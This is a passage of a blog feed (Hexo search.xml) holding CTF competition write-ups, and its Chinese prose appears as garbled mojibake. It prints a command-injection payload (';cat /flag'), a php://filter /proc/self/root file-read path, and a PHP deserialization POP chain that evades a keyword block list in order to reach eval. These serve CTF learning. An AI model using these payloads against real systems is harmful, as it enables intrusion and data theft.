alt="image-20230223180503199"></p><p>ç„¶åè®¿é—®backdoorå°±å¯ä»¥å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½™æš¨æ¯çº¿ä¸‹èµ›</title>
      <link href="/2022/11/22/%E4%BD%99%E6%9A%A8%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
      <url>/2022/11/22/%E4%BD%99%E6%9A%A8%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="huluwa"><a href="#huluwa" class="headerlink" title="huluwa"></a>huluwa</h3><p>éŸ³é¢‘æœ«å°¾æœ‰æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Huluxiaojinggang&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;secret&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;yeye&#x27;</span>]))</span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;yeye&#x27;</span>], <span class="variable">$secret</span>);</span><br><span class="line"><span class="variable">$qwer</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>], <span class="variable">$secret</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$qwer</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$qwer</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Huluxiaojinggang&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ•°ç»„æŠ¥é”™ä½¿å¾—secret=nullç„¶åå°±å¯ä»¥åˆ©ç”¨å‡½æ•°è·å¾—$qweré‡Œé¢çš„å†…å®¹ã€‚</p><p>æ‰€ä»¥æœ€ç»ˆpayloadï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yeye[]=1&amp;Huluxiaojinggang=c7e4698914f5d06bf59a9b3b081046f261170deb991ca94e9c2ddfafe928560a&amp;Shejing=;cat /flag</span><br></pre></td></tr></table></figure><h3 id="php-levels"><a href="#php-levels" class="headerlink" title="php-levels"></a>php-levels</h3><p>é¦–å…ˆé‡‡ç”¨phpä¼ªåè®®è¯»å–äº†hint.phpæ–‡ä»¶é‡Œé¢å†…å®¹</p><p><img src="https://gitee.com/fpointzero/image-repo/raw/master/img/1668932265719.png" alt="1668932265719"></p><p>äº‹å®ä¸Šè¿™ä¸ªèƒ½å‡ºæ¥çº¯å±å·§åˆï¼ŒåŸæœ¬èƒ½ç»•è¿‡çš„payloadåº”å½“æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/usr/share/nginx/html/hint.php</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œbase64è§£ç å¾—åˆ°äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rice-&gt;<span class="title function_ invoke__">nothing</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;chance?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fish-&gt;d))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;you wrong&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$no</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|base|echo|cp|\$|\*|\+|\^|scan|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$pop</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you will get flag&quot;</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªphpé“¾æ¡</p><p>ä»dog-&gt;ct-&gt;mouse-&gt;get</p><p>æ„é€ payloadç»•è¿‡æ­£åˆ™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rice = <span class="keyword">new</span> get;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;chance?&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fish = <span class="keyword">new</span> mouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;print(`c\at /realflag/you_want_flag.php`);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> dog;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;s:7:&quot;chance?&quot;;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:42:&quot;print(`c\at /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/image-repo/raw/master/img/1668932556210.png" alt="1668932556210"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c91d38f0-86ea-4f36-b4d8-5e6a716ea8fe&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ç§æ„é€ æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;?&gt;&lt;?=`nl</span></span><br><span class="line"><span class="string">/realflag/you_want_flag.php`;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ç”¨è¿™?&gt;&lt;?æ›¿ä»£äº†echoçš„ä½œç”¨</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
